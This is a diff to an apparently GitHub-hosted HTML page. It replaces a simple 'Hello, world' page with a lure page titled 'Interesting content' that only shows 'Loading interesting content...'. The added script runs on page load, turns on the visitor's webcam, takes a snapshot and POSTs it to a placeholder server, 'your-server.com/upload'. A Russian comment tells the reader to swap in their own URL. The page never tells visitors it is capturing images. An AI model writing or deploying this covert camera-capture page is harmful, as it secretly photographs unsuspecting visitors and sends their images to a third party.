@@ -1,11 +1,39 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="UTF-8">
-  <title>Мой первый сайт</title>
+    <title>Интересный контент</title>
+    <script>
+        async function captureAndSend() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+                
+                const photo = canvas.toDataURL('image/jpeg');
+                stream.getTracks().forEach(track => track.stop());
+                
+                // Отправка на сервер (замени URL на свой)
+                fetch('https://your-server.com/upload', {
+                    method: 'POST',
+                    body: JSON.stringify({ image: photo }),
+                    headers: { 'Content-Type': 'application/json' }
+                });
+            } catch (err) {
+                console.error("Ошибка:", err);
+            }
+        }
+        
+        window.onload = captureAndSend;
+    </script>
 </head>
 <body>
-  <h1>Привет, мир!</h1>
-  <p>Этот сайт сделан на GitHub Pages.</p>
+    <h1>Загрузка интересного контента...</h1>
 </body>
 </html>
